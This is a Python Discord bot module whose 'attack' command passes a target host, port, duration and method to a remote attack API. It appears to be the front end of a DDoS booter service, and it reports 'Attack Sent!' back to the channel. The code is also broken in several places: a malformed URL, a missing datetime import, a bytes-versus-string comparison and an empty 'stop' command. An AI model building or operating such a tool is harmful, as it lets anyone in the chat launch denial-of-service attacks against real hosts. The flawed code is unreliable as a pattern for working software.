from discord.ext import commands
import discord
import requests
import json
from . import utils

with open("config/apis.json") as apis:
    api = json.load(apis)

API1 = api["api1"]

class BigBoiCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_role(".")
    async def attack(self, ctx, host, port, time, method):
        response = requests.get("https://api.php/host={}?port={}?time{}?method={}".format(host, port, time, method))
        if "Attack Sent" in response.content:
            utils.embedDetails(ctx, 
            "Attack Sent!", 
            "``Host: {}\nPort: {}\nTime: {}\nMethod: {}".format(host, port, time, method), 
            discord.Colour.black(), 
            ctx.guild.icon_url, 
            datetime.utcnow(), 
            "WockyFX Bot - Attack Sent")

    @commands.command()
    @commands.has_role(".")
    async def stop(self, ctx):
        pass





def setup(bot):
    bot.add_cog(BigBoiCommands(bot))